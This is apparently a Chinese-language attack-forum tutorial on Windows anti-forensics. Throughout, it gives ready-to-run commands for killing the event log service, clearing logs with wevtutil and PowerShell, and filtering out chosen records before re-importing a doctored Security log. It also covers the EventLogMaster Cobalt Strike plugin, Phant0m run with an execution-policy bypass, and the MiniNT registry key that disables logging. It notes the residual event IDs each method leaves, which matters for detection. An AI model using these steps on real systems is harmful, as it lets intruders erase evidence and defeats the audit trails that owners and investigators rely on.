0x01 关闭日志服务
===========

```php
#找出日志进程的PID  
Get-WmiObject -Class win32\_service -Filter "name = 'eventlog'"  

#kill掉对应PID  
taskkill /F /PID 1792   
```

![image_GasRFIcNrh.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7a32737ac1006b0b3dde0d1757aed4ed2dd80d45.png)

重启可进行恢复

![image_SXP36zkZbR.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b071e1bab20dd80f679d76f4e3b15068ec0d2b02.png)

0x02 wevtutil
=============

它是一个系统工具，可让您查找有关事件日志和发布者的详细信息。您还可以使用此命令安装和卸载事件清单、导出、存档和清除日志。

统计日志列表，查询所有日志信息，包含时间，数目  
`wevtutil.exe gli Application`

![7CJpJDZGxfHuRQnFe35Feb_7fEi99B1yY.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1fbc58fcee9123b31e71d2a273aa332c26f1a887.png)

查看指定类别的日志内容  
`wevtutil qe /f:text Application`

![erLiChLMuDg8wSkAhyNwEb_30KQ2priW3.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b8d327cfa711967664aa20f565cc4d86b4e1b9df.png)

删除该类日志所有内容  
`wevtutil cl Application`

![ePfYP4ys5TC3DCsRLyNEye_2LOMRfvjxH.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-75607e88516b4cf66d637eb71e35e9b5b2688095.png)

![74mU9si2SVbSKQZep8UkL7_f8tJOo9zBW.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9340baa4e6656dd4d46f09cc9efc937cf0f89bc6.png)

但清除完会留下1012或104的系统日志

![6RnXS1Hr43QJHXugmXY3nk_czepRGDjja.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-732d6e89062d74c0471fe717df55543b0d2c0c69.png)

获取最近十条日志  
`wevtutil.exe qe Security /f:text /rd:true /c:10`

![mSNMxDRG8sdj67ux7pbhU8_g0z4qs83sC.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7135c93655b572db08ffb4115cd1c4bdf4d093f8.png)

日志导出过滤

```php
wevtutil.exe epl Security 1.evtx  
过滤分两种：  
​  
按日志号过滤：  
wevtutil epl Security 1.evtx "/q: \*\[System \[(EventID!=1112)\]\]"  
​  
通过加or语句  
wevtutil epl Security 1.evtx "/q:\*\[System \[(EventID>13032) or (EventRecordID<13030)\]\]"  
​  
按时间过滤：  
wevtutil epl Security new.evtx "/q: \*\[System \[TimeCreated\[@SystemTime >'2021-09-08T17:21:00' or @SystemTime <'2021-09-08T09:20:00'\]\]\]"  
这里删除SystemTime为2021-08-20T03:20:00至2018-08-29T03:21:00之间的日志，结果保存为new.evtx，然后可以把删除处理后的日志进行重新导入  
​  
组合过滤：  
wevtutil epl Security asd.evtx "/q:(Event/System/TimeCreated\[@SystemTime >'2021-09-07T03:21:00' or @SystemTime <'2021-09-04T03:20:00'\]) and Event/System/EventID=4624"  
​  
注意：首先需要确定系统时间，如图时差为8小时，对应清除日志时间要向前移8小时  
wevtutil.exe qe Security /f:xml /rd:true /c:1
```

![image_RY0Pkf1NU6.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-15007adc3470c075476704c0f76286adc0ed70df.png)  
编译：通过GitHub的项目重新进行导入

<https://github.com/3gstudent/Homework-of-C-Language/blob/master/DeleteRecordbyTerminateProcess(ReplaceFile).cpp>

编译前添加

`#include <stdio.h>`  
`#include <tchar.h>`

```php
该项目原理：
1、解除本身日志文件的占用  
2、结束日志进程  
3、释放日志文件句柄  
4、替换日志文件  
5、重启日志服务  
```

![wrnxgA98mQJcds399S9yxb_WMbqwJoSoD.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8197a9375a3698e3fb73e04a15fa11fa13f078fb.png)

运行完成后把删除处理后的日志重新导入安全日志，但会留下7034的系统日志

![6joud56Vw4kHPChD4mBzhY_V2t4sDbPvx.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c2ece5cadaec9e1a177f0ae27a7ae1ad37794551.png)

0x03 EventLogMaster
===================

这是一款用于日志清除的Cobalt Strike插件，可指定地址、ip等

<https://github.com/QAX-A-Team/EventLogMaster>

![image_MZj6DOhPaJ.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2c868a955de83ec0f79606882bf2f6dbfc22a015.png)

如图所示源地址172.20.10.3记录在remoteconnectionmanager日志中，选择相应的日志类型并填写好源地址进行清除

![image_GHwrizQ6la.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-aaf47b30ad7c92af52bf75d1f15de84cc0ab85fe.png)

![image_6ts958y1DY.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-20b5a31b42eea1b784aba9384238d615350c41b0.png)

成功清除该IP相关的日志

![image_9j0eq0TsEO.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b51b68d5f769b6ccbf4d975c374813fa1f5fb9a3.png)

0x04 Powershell
===============

执行以下两条命令

```php
Clear-Eventlog -LogName Security
Clear-Eventlog -LogName System
```

![7iMB6ftagrTCEmsHC4cwGY_nD7VYLCip9.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62d0c4da97ab1dea66420809d4968f358ae0d310.png)

清除完会分别留下104和1102的清除日志

![nQHN7FEF95nk1gXtwnBGC6_UNn1toCo5u.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-88b3b118aa869ff61e3e6cc4180e44e552c9f70e.png)

![hw4uDD45yxkMPqE8F99EXZ_UeUMd_e9RT.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f3b3e1ce9fd5186c980700b3da39196992e60c62.png)

0x05 Phantom
============

在Windows操作系统上，svchost.exe管理服务，而服务实际上是在svchost.exe下作为线程运行的。Phant0m以事件日志服务为目标，找到负责事件日志服务的进程，它会检测并终止负责事件日志服务的线程。因此，虽然事件日志服务似乎在系统中运行，但是Phant0m终止了线程而没有终止进程，所以系统不收集日志。

项目地址：<https://github.com/hlldz/Phant0m>

可以通过编译后的exe程序或者项目的cs插件运行

![5dqVh2ZGjD6PFuyu9Q1vSy_yrMFX_yW9R.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-92617d81343adfcb2611a4f1a427327fcdf72c00.png)

或通过Powershell分别执行以下三条命令

```php
1、powershell -ep bypass

2、Import-Module .\\Invoke-Phant0m.ps1

3、Invoke-Phant0m
```

![oFpGJDYjyYuFbu947Txzef_1F-kLEURrv.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c88ae3e5b1fdfb7116797139ab101e919e6f7992.png)

0x06 MiniNT注册表
==============

可以使用注册表，创建一个新的注册表项，然后重新启动机器以加载配置单元。

`reg add “HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt”`

此键禁用事件查看器，从而限制它生成日志。

![j4j93MHSf5XpK9uTqtD43Y_pGwFvhsKot.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-945b607974701d4ce6bc7b4aadd4578ba3f13c90.png)

![ituLMk8YdyxN9dfnpStWHc_qKsbqEAU7r.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1af3050f59f6b954a11de106116011a42d05e521.png)

删除重启后可正常查看日志

![qvC2TJJ5BCz5HXokM4fUKK_Y8IGx7akLt.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a40516d7ee284209742d4b5224908622318daaf9.png)